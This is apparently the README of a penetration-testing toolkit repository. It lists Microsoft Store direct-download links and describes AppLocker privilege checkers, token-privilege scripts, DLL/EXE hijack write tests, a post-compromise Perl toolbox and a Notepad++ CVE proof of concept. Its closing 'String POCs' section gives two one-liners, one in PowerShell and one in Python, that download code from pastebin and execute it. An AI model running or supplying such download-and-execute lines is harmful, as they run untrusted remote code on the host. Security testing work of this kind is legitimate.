
### Copies of bins for download 

The Python Embeddable 3.11.0 for the .tar
https://www.python.org/downloads/windows/


##### DD Deeplinks for the MS store rollback
ESRB [E] Everyone ratings will work in most cases - however ESRB Teen [T] and other ratings may be restricted.  
Most social media type apps will be Teen [T]  
ESRB [3] For 3+

[E] [x64dbg] - https://get.microsoft.com/installer/download/9PGJGD53TN86  
[E] [Python3.11] - https://get.microsoft.com/installer/download/9NRWMJP3717K  (RETIRED)  
[E] [Direct Python 3.10] - [Microsoft direct link](http://tlu.dl.delivery.mp.microsoft.com/filestreamingservice/files/fe6ab4d1-6021-42f3-9b2e-145143f6da8b?P1=1770859794&P2=404&P3=2&P4=Uxui1uOd5BTcNvgLXsj%2bNrcAzkn9hjwyfX7CPa0Fkmouhjmil74pOTYgqpSsFdIsvlk9dzvaZlka%2bKsj3g0U0A%3d%3d)  
[3] [Python3.12] - https://get.microsoft.com/installer/download/9NCVDN91XZQP  
[E] [Microsoft PowerToys] - https://get.microsoft.com/installer/download/XP89DCGQ3K6VLD  
[3] [PowerShell 7] - https://get.microsoft.com/installer/download/9MZ1SNWT0N5D  
[3] [PowerShell Preview] - https://get.microsoft.com/installer/download/9P95ZZKTNRN4  
[T] [TikTok - PSPF restricted] - https://get.microsoft.com/installer/download/9NH2GPH4JZS4  
[3] [DevToys] - https://get.microsoft.com/installer/download/9PGCV4V3BK4W  
[E] [Windows App] - https://get.microsoft.com/installer/download/9N1F85V9T8BN  
[E] [Splastop Business] - https://get.microsoft.com/installer/download/9NKVM63J25PB  
[E] [RealVNC Viewer] - https://get.microsoft.com/installer/download/XP99DVCPGKTXNJ  
[3] [System Informer] - https://get.microsoft.com/installer/download/XPFMX3KSKZ523M

#### Install System Informer via winget
```winget install --id=WinsiderSS.SystemInformer -e```

#### Details of tools found in this repo
- The `1package.tar` and `2package.tar` are the Prowler `.whl` files for Python portable install
- The `Certify.exe` is what it says, its the certify authentic binary
- The `.Appx` are for the MS Store and `1b765123-a5ce-4bd0-9c0f-9b0b8cc76095` is the store itself
- The `SoAudit.exe` is the auditing tool, Alpha release only so far
- The `TokenPriv.ps1` is for Admin use to enable different privs in the session as needed
- The `gpg-debs.tar` is the set of deb files for installing gpg on minimal Kali, required when apt is not keyed yet
- `odapplockprivs.exe` is for default AppLocker paths checking for any wild files with privs for Everyone user
- `fulloddapplockerprivs.exe` is a full user group check in AppLocker paths for privs - users are; Everyone, Users, Authenticated Users and Guests
- `Processhacker` is the binary for 2.39 of ProcessHacker, however System Informer is the modern choice
- `python` is the official embed 3.11.0 release
- `regsvr32.c` and the related `.exe` is a source code for poc testing the NoptePad++ CVE from 2025
- `scriptfile2.js` is a write test, check comments in the file
- `whl.ps1` is a helper file to unpack `.whl` files to a location - specifically the .tar files `1package.tar` and `2package.tar` but can be for any large `.whl` sets obv. 
- `JackWrite.dll` is a file write test for missing .dlls
- `JackWriteExe.exe` is a file write test for missing .exes
- `toolbox.pl` and pearls.txt is for containers with only pearl binary/tooling and provides basic OS tooling - post comp script and command reference list
- kubectl.txt is for kubes/containers manual auditing reference list
- MSNotepadAppx is a folder of the older appx packages and deps related to the Feb CVE for 2026-20841
- `PythonSoftwareFoundation.Python.3.10_3.10.3056.0_x64__qbz5n2kfra8p0.Msix` MS removed 3.10.11 and 3.11 Python from AU region store so this .msix is a copy.

### String POCs

IEX Calc POC
```iex ((Invoke-WebRequest 'https://pastebin.com/raw/Gnb4K1Qq').Content)```

Subprocess Calc POC
```import urllib.request
url = "https://pastebin.com/raw/kFzy7JT5"
response = urllib.request.urlopen(url)
code = response.read().decode()
exec(code)
